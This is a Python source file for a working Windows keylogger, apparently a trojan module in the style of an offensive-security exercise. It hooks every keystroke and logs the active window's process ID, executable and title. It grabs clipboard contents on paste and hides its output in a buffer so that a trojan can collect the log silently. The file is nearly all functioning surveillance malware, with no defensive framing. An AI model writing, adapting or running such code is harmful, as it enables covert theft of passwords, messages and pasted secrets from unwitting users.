from ctypes import *
from io import StringIO

# import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

# monitoring time
TIMEOUT = 10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    # capture the active window and its pid
    def get_current_process(self):
        # get the handle of active window and then its pid
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))    # need to check if
        process_id = f'{pid.value}'

        # find the actual executable name of the process
        executable = create_unicode_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameW(h_process, None, byref(executable), 512)

        # grab the full text of the window's title bar
        window_title = create_unicode_buffer(512)
        # windll.user32.GetWindowTextW.argtypes = (c_ulong, c_ulonglong, c_int)
        windll.user32.GetWindowTextW(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
            print(f'Error: {windll.kernel32.GetLastError()}')

        print('\n[PID:{} - {} - {}]'.format(process_id, executable.value, self.current_window))

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    # define the callback method
    def mykeystroke(self, event):
        # check if object has switched the window
        if event.WindowName != self.current_window:
            self.get_current_process()

        # output the keyboard event, including normal key and combo stroke(e.g. Ctrl+V)
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end=' ')
        else:
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')

        # return True to allow the next hook in the chain - if there is one
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    # initialize HookManager and bind KeyDown event with our mykeystroke() function
    kl = KeyLogger()
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()   # Hook all the keyboard event
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

# if this file is invoked by the trojan, then it won't output the log
if __name__ == '__main__':
    print(run())
    print('done.')
